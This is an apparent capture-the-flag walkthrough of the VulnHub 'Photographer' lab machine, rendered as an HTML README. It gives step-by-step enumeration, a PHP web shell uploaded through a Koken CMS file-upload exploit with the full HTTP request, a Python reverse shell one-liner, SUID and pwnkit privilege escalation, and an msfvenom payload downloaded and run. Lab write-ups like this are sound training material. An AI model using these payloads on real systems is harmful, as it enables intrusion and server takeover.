@@ -1,0 +1,408 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>README.md</title>
+</head><body><br/>
+IP - 10.0.2.46<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+nmap result<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/offensive_security_playground/Photographer]<br/>
+└─# nmap -sC -sV 10.0.2.46 -p- -oN nmap_all_port.txt<br/>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-03 03:45 +0630<br/>
+Nmap scan report for 10.0.2.46<br/>
+Host is up (0.000090s latency).<br/>
+Not shown: 65531 closed tcp ports (reset)<br/>
+PORT &nbsp; &nbsp; STATE SERVICE &nbsp; &nbsp; VERSION<br/>
+80/tcp &nbsp; open &nbsp;http &nbsp; &nbsp; &nbsp; &nbsp;Apache httpd 2.4.18 ((Ubuntu))<br/>
+|_http-server-header: Apache/2.4.18 (Ubuntu)<br/>
+|_http-title: Photographer by v1n1v131r4<br/>
+139/tcp &nbsp;open &nbsp;netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br/>
+445/tcp &nbsp;open &nbsp;netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)<br/>
+8000/tcp open &nbsp;http &nbsp; &nbsp; &nbsp; &nbsp;Apache httpd 2.4.18 ((Ubuntu))<br/>
+|_http-generator: Koken 0.22.24<br/>
+|_http-server-header: Apache/2.4.18 (Ubuntu)<br/>
+|_http-title: daisa ahomi<br/>
+|_http-trane-info: Problem with XML parsing of /evox/about<br/>
+MAC Address: 08:00:27:B4:F7:6E (Oracle VirtualBox virtual NIC)<br/>
+Service Info: Host: PHOTOGRAPHER<br/>
+<br/>
+Host script results:<br/>
+|_clock-skew: mean: 1h40m01s, deviation: 2h53m13s, median: 0s<br/>
+| smb2-security-mode: <br/>
+| &nbsp; 311: <br/>
+|_ &nbsp; &nbsp;Message signing enabled but not required<br/>
+| smb-os-discovery: <br/>
+| &nbsp; OS: Windows 6.1 (Samba 4.3.11-Ubuntu)<br/>
+| &nbsp; Computer name: photographer<br/>
+| &nbsp; NetBIOS computer name: PHOTOGRAPHER\x00<br/>
+| &nbsp; Domain name: \x00<br/>
+| &nbsp; FQDN: photographer<br/>
+|_ &nbsp;System time: 2023-03-02T16:16:16-05:00<br/>
+|_nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 000000000000 (Xerox)<br/>
+| smb-security-mode: <br/>
+| &nbsp; account_used: guest<br/>
+| &nbsp; authentication_level: user<br/>
+| &nbsp; challenge_response: supported<br/>
+|_ &nbsp;message_signing: disabled (dangerous, but default)<br/>
+| smb2-time: <br/>
+| &nbsp; date: 2023-03-02T21:16:14<br/>
+|_ &nbsp;start_date: N/A<br/>
+<br/>
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br/>
+Nmap done: 1 IP address (1 host up) scanned in 38.57 seconds<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Found vulnerable CMS "Koken 0.22.24" (port 8000)<br/>
+<br/>
+This version is vulnerable into (Koken CMS 0.22.24 - Arbitrary File Upload (Authenticated))<br/>
+<br/>
+https://www.exploit-db.com/exploits/48706<br/>
+<br/>
+Found admin login panel at http://10.0.2.46:8000/admin/<br/>
+<br/>
+I need to login with someone credential for file upload. So, I need to enumerate smb server because one and only server left that I need to enumerate.<br/>
+<br/>
+Enumerating SMB<br/>
+<br/>
+I run smbmap and found one share:<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# smbmap -H 10.0.2.46 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+[+] Guest session &nbsp; &nbsp; &nbsp; IP: 10.0.2.46:445 &nbsp; &nbsp; &nbsp; Name: 10.0.2.46 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Disk &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Permissions &nbsp; &nbsp; Comment<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ---- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;----------- &nbsp; &nbsp; -------<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; print$ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;NO ACCESS &nbsp; &nbsp; &nbsp; Printer Drivers<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; sambashare &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;READ ONLY &nbsp; &nbsp; &nbsp; Samba on Ubuntu<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; IPC$<br/>
+<br/>
+<br/>
+Connect "sambashare" with smbclient found 2 juicy files:<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# smbclient //10.0.2.46/sambashare<br/>
+Password for [WORKGROUP\root]:<br/>
+Try "help" to get a list of possible commands.<br/>
+smb: \&gt; ls -la<br/>
+NT_STATUS_NO_SUCH_FILE listing \-la<br/>
+smb: \&gt; ls<br/>
+&nbsp; . &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; D &nbsp; &nbsp; &nbsp; &nbsp;0 &nbsp;Tue Jul 21 08:00:07 2020<br/>
+&nbsp; .. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;D &nbsp; &nbsp; &nbsp; &nbsp;0 &nbsp;Tue Jul 21 16:14:25 2020<br/>
+&nbsp; mailsent.txt &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;N &nbsp; &nbsp; &nbsp;503 &nbsp;Tue Jul 21 07:59:40 2020<br/>
+&nbsp; wordpress.bkp.zip &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; N 13930308 &nbsp;Tue Jul 21 07:52:23 2020<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 278627392 blocks of size 1024. 264268400 blocks available<br/>
+<br/>
+I downloaded those file and read mailsent.txt. Found login credential:<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/offensive_security_playground/Photographer]<br/>
+└─# smbclient //10.0.2.46/sambashare<br/>
+Password for [WORKGROUP\root]:<br/>
+Try "help" to get a list of possible commands.<br/>
+smb: \&gt; get mailsent.txt<br/>
+getting file \mailsent.txt of size 503 as mailsent.txt (27.3 KiloBytes/sec) (average 27.3 KiloBytes/sec)<br/>
+smb: \&gt; get wordpress.bkp.zip<br/>
+getting file \wordpress.bkp.zip of size 13930308 as wordpress.bkp.zip (64780.0 KiloBytes/sec) (average 59668.0 KiloBytes/sec)<br/>
+smb: \&gt; exit<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/offensive_security_playground/Photographer]<br/>
+└─# cat mailsent.txt &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+Message-ID: &lt;4129F3CA.2020509@dc.edu&gt;<br/>
+Date: Mon, 20 Jul 2020 11:40:36 -0400<br/>
+From: Agi Clarence &lt;agi@photographer.com&gt;<br/>
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0<br/>
+X-Accept-Language: en-us, en<br/>
+MIME-Version: 1.0<br/>
+To: Daisa Ahomi &lt;daisa@photographer.com&gt;<br/>
+Subject: To Do - Daisa Website's<br/>
+Content-Type: text/plain; charset=us-ascii; format=flowed<br/>
+Content-Transfer-Encoding: 7bit<br/>
+<br/>
+Hi Daisa!<br/>
+Your site is ready now.<br/>
+Don't forget your secret, my babygirl ;)<br/>
+<br/>
+<br/>
+Username and password for Koken 0.22.24 login:<br/>
+<br/>
+username - daisa@photographer.com<br/>
+password - babygirl<br/>
+<br/>
+<br/>
+Now, I can upload RCE shell with this exploit (https://www.exploit-db.com/exploits/48706).<br/>
+<br/>
+1. Create a malicious PHP file with this content:<br/>
+<br/>
+&nbsp; &nbsp;&lt;?php system($_GET['cmd']);?&gt;<br/>
+<br/>
+2. Save as "image.php.jpg"<br/>
+<br/>
+3. Authenticated, go to Koken CMS Dashboard, upload your file on "Import Content" button (Library panel) and send the HTTP request to Burp.<br/>
+<br/>
+4. On Burp, rename your file to "image.php"<br/>
+<br/>
+<br/>
+POST /koken/api.php?/content HTTP/1.1<br/>
+Host: target.com<br/>
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0<br/>
+Accept: */*<br/>
+Accept-Language: en-US,en;q=0.5<br/>
+Accept-Encoding: gzip, deflate<br/>
+Referer: https://target.com/koken/admin/<br/>
+x-koken-auth: cookie<br/>
+Content-Type: multipart/form-data; boundary=---------------------------2391361183188899229525551<br/>
+Content-Length: 1043<br/>
+Connection: close<br/>
+Cookie: PHPSESSID= [Cookie value here]<br/>
+<br/>
+-----------------------------2391361183188899229525551<br/>
+Content-Disposition: form-data; name="name"<br/>
+<br/>
+image.php &lt;------------(Here)<br/>
+-----------------------------2391361183188899229525551<br/>
+Content-Disposition: form-data; name="chunk"<br/>
+<br/>
+0<br/>
+-----------------------------2391361183188899229525551<br/>
+Content-Disposition: form-data; name="chunks"<br/>
+<br/>
+1<br/>
+-----------------------------2391361183188899229525551<br/>
+Content-Disposition: form-data; name="upload_session_start"<br/>
+<br/>
+1594831856<br/>
+-----------------------------2391361183188899229525551<br/>
+Content-Disposition: form-data; name="visibility"<br/>
+<br/>
+public<br/>
+-----------------------------2391361183188899229525551<br/>
+Content-Disposition: form-data; name="license"<br/>
+<br/>
+all<br/>
+-----------------------------2391361183188899229525551<br/>
+Content-Disposition: form-data; name="max_download"<br/>
+<br/>
+none<br/>
+-----------------------------2391361183188899229525551<br/>
+Content-Disposition: form-data; name="file"; filename="image.php" &lt;------------(Here)<br/>
+Content-Type: image/jpeg<br/>
+<br/>
+&lt;?php system($_GET['cmd']);?&gt;<br/>
+<br/>
+-----------------------------2391361183188899229525551--<br/>
+<br/>
+<br/>
+<br/>
+5. On Koken CMS Library, select you file and put the mouse on "Download File" to see where your file is hosted on server.<br/>
+<br/>
+<br/>
+Boom! now I got RCE:<br/>
+<br/>
+http://10.0.2.46:8000/storage/originals/20/7f/image.php?cmd=whoami<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Got Reverse Shell with Python 3<br/>
+<br/>
+https://www.revshells.com/<br/>
+<br/>
+payload - python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.4",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'<br/>
+<br/>
+Full URL - http://10.0.2.46:8000/storage/originals/20/7f/image.php?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.0.2.4%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22sh%22)%27<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# nc -lvnp 4444 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+listening on [any] 4444 ...<br/>
+connect to [10.0.2.4] from (UNKNOWN) [10.0.2.46] 57032<br/>
+$ whoami<br/>
+whoami<br/>
+www-data<br/>
+<br/>
+<br/>
+<br/>
+www-data@photographer:/home/daisa$ cat user.txt <br/>
+d41d8cd98f00b204e9800998ecf8427e (vulhub flag)<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Priviledge Escalation (SUID /usr/bin/php7.2)<br/>
+<br/>
+After Running linpeas, found unknown SUID called /usr/bin/php7.2 so I search at gtfobin and found php SUID:<br/>
+<br/>
+https://gtfobins.github.io/gtfobins/php/#suid<br/>
+<br/>
+<br/>
+Step 1:<br/>
+<br/>
+www-data@photographer:/tmp$ CMD="/bin/sh"<br/>
+<br/>
+Step 2:<br/>
+<br/>
+www-data@photographer:/tmp$ /usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"<br/>
+# whoami<br/>
+root<br/>
+<br/>
+Boom! I am root now.<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Another way to Priviledge Escalation (cve_2021_4034_pwnkit_lpe_pkexec (kernel exploit))<br/>
+<br/>
+Priviledge Escalate with metasploit using "multi/recon/local_exploit_suggester":<br/>
+<br/>
+Step 1:<br/>
+<br/>
+Generate payload with msfvenom<br/>
+<br/>
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.2.4 LPORT=5555 -f elf &gt; reverse.elf<br/>
+<br/>
+Step 2:<br/>
+<br/>
+Transfer the payload with python server<br/>
+<br/>
+python2 -m SimpleHTTPServer 80<br/>
+Serving HTTP on 0.0.0.0 port 80 ...<br/>
+10.0.2.47 - - [03/Mar/2023 17:45:18] "GET /reverse.elf HTTP/1.1" 200 -<br/>
+<br/>
+Step 3:<br/>
+<br/>
+Downloaded in victim machine and execute it but need to listen first with metasploit<br/>
+<br/>
+msf6 &gt; use exploit/multi/handler<br/>
+<br/>
+msf6 exploit(multi/handler) &gt; set payload linux/x64/meterpreter/reverse_tcp<br/>
+<br/>
+msf6 exploit(multi/handler) &gt; set LHOST 10.0.2.4<br/>
+<br/>
+msf6 exploit(multi/handler) &gt; set LPORT 5555<br/>
+<br/>
+msf6 exploit(multi/handler) &gt; exploit<br/>
+<br/>
+[*] Started reverse TCP handler on 10.0.2.4:5555 <br/>
+[*] Sending stage (3045348 bytes) to 10.0.2.47<br/>
+[*] Meterpreter session 1 opened (10.0.2.4:5555 -&gt; 10.0.2.47:59080) at 2023-03-03 17:51:57 +0630 &lt;----------- After executing reverse.elf<br/>
+<br/>
+<br/>
+<br/>
+www-data@photographer:/tmp$ wget http://10.0.2.4/reverse.elf<br/>
+--2023-03-03 06:21:46-- &nbsp;http://10.0.2.4/reverse.elf<br/>
+Connecting to 10.0.2.4:80... connected.<br/>
+HTTP request sent, awaiting response... 200 OK<br/>
+Length: 250 [application/octet-stream]<br/>
+Saving to: 'reverse.elf'<br/>
+<br/>
+reverse.elf &nbsp; &nbsp; &nbsp; &nbsp; 100%[===================&gt;] &nbsp; &nbsp; 250 &nbsp;--.-KB/s &nbsp; &nbsp;in 0s &nbsp; &nbsp; &nbsp;<br/>
+<br/>
+2023-03-03 06:21:46 (91.1 MB/s) - 'reverse.elf' saved [250/250]<br/>
+<br/>
+www-data@photographer:/tmp$ chmod +x reverse.elf <br/>
+www-data@photographer:/tmp$ ./reverse.elf<br/>
+<br/>
+Step 4:<br/>
+<br/>
+Go background and use "multi/recon/local_exploit_suggester"<br/>
+<br/>
+meterpreter &gt; bg<br/>
+[*] Backgrounding session 1...<br/>
+msf6 exploit(multi/handler) &gt; use multi/recon/local_exploit_suggester<br/>
+msf6 post(multi/recon/local_exploit_suggester) &gt;<br/>
+<br/>
+msf6 post(multi/recon/local_exploit_suggester) &gt; set SESSION 1<br/>
+<br/>
+msf6 post(multi/recon/local_exploit_suggester) &gt; exploit<br/>
+<br/>
+[*] 10.0.2.47 - Collecting local exploits for x64/linux...<br/>
+[*] 10.0.2.47 - 174 exploit checks are being tried...<br/>
+[+] 10.0.2.47 - exploit/linux/local/cve_2021_3493_overlayfs: The target appears to be vulnerable.<br/>
+[+] 10.0.2.47 - exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec: The target is vulnerable.<br/>
+[+] 10.0.2.47 - exploit/linux/local/cve_2022_0995_watch_queue: The target appears to be vulnerable.<br/>
+[+] 10.0.2.47 - exploit/linux/local/glibc_realpath_priv_esc: The target appears to be vulnerable.<br/>
+[+] 10.0.2.47 - exploit/linux/local/network_manager_vpnc_username_priv_esc: The service is running, but could not be validated.<br/>
+[+] 10.0.2.47 - exploit/linux/local/pkexec: The service is running, but could not be validated.<br/>
+[+] 10.0.2.47 - exploit/linux/local/ptrace_traceme_pkexec_helper: The target appears to be vulnerable.<br/>
+[+] 10.0.2.47 - exploit/linux/local/su_login: The target appears to be vulnerable.<br/>
+[+] 10.0.2.47 - exploit/linux/local/sudo_baron_samedit: The target appears to be vulnerable. sudo 1.8.16 is a vulnerable build.<br/>
+[+] 10.0.2.47 - exploit/linux/local/ubuntu_enlightenment_mount_priv_esc: The target appears to be vulnerable.<br/>
+[*] Running check method for exploit 56 / 56<br/>
+[*] 10.0.2.47 - Valid modules for session 1:<br/>
+<br/>
+<br/>
+Step 5:<br/>
+<br/>
+use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec<br/>
+<br/>
+msf6 post(multi/recon/local_exploit_suggester) &gt; use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec<br/>
+<br/>
+msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) &gt; set LPORT 6666<br/>
+LPORT =&gt; 6666<br/>
+msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) &gt; set SESSION 1<br/>
+SESSION =&gt; 1<br/>
+msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) &gt; exploit<br/>
+<br/>
+[*] Started reverse TCP handler on 10.0.2.4:6666 <br/>
+[*] Running automatic check ("set AutoCheck false" to disable)<br/>
+[!] Verify cleanup of /tmp/.jlzuzj<br/>
+[+] The target is vulnerable.<br/>
+[*] Writing '/tmp/.diijlf/kmvldhuu/kmvldhuu.so' (548 bytes) ...<br/>
+[!] Verify cleanup of /tmp/.diijlf<br/>
+[*] Sending stage (3045348 bytes) to 10.0.2.47<br/>
+[+] Deleted /tmp/.diijlf/kmvldhuu/kmvldhuu.so<br/>
+[+] Deleted /tmp/.diijlf/.evvtjllp<br/>
+[+] Deleted /tmp/.diijlf<br/>
+[*] Meterpreter session 2 opened (10.0.2.4:6666 -&gt; 10.0.2.47:37000) at 2023-03-03 17:55:12 +0630<br/>
+<br/>
+meterpreter &gt;<br/>
+<br/>
+<br/>
+Final Flag<br/>
+<br/>
+meterpreter &gt; cat proof.txt<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; .:/://::::///:-` &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -/++:+`:--:o: &nbsp;oo.-/+/:` &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;-++-.`o++s-y:/s: `sh:hy`:-/+:` &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;:o:``oyo/o`. ` &nbsp; &nbsp; &nbsp;```/-so:+--+/` &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;-o:-`yh//. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; `./ys/-.o/ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ++.-ys/:/y- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/s-:/+/:/o` &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;o/ :yo-:hNN &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; .MNs./+o--s` &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ++ soh-/mMMN--.` &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;`.-/MMMd-o:+ -s &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;.y &nbsp;/++:NMMMy-.`` &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;``-:hMMMmoss: +/ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;s- &nbsp; &nbsp; hMMMN` shyo+:. &nbsp; &nbsp;-/+syd+ :MMMMo &nbsp; &nbsp; h &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;h &nbsp; &nbsp; `MMMMMy./MMMMMd: &nbsp;+mMMMMN--dMMMMd &nbsp; &nbsp; s. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;y &nbsp; &nbsp; `MMMMMMd`/hdh+..+/.-ohdy--mMMMMMm &nbsp; &nbsp; +- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;h &nbsp; &nbsp; &nbsp;dMMMMd:```` &nbsp;`mmNh &nbsp; ```./NMMMMs &nbsp; &nbsp; o. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;y. &nbsp; &nbsp; /MMMMNmmmmd/ `s-:o &nbsp;sdmmmmMMMMN. &nbsp; &nbsp; h` &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;:o &nbsp; &nbsp; &nbsp;sMMMMMMMMs. &nbsp; &nbsp; &nbsp; &nbsp;-hMMMMMMMM/ &nbsp; &nbsp; :o &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; s: &nbsp; &nbsp; `sMMMMMMMo - . `. . hMMMMMMN+ &nbsp; &nbsp; `y` &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; `s- &nbsp; &nbsp; &nbsp;+mMMMMMNhd+h/+h+dhMMMMMMd: &nbsp; &nbsp; `s- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;`s: &nbsp; &nbsp;--.sNMMMMMMMMMMMMMMMMMMmo/. &nbsp; &nbsp;-s. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/o.`ohd:`.odNMMMMMMMMMMMMNh+.:os/ `/o` &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; .++-`+y+/:`/ssdmmNNmNds+-/o-hh:-/o- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ./+:`:yh:dso/.+-++++ss+h++.:++- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;-/+/-:-/y+/d:yh-o:+--/+/:` &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; `-///////////////:` &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
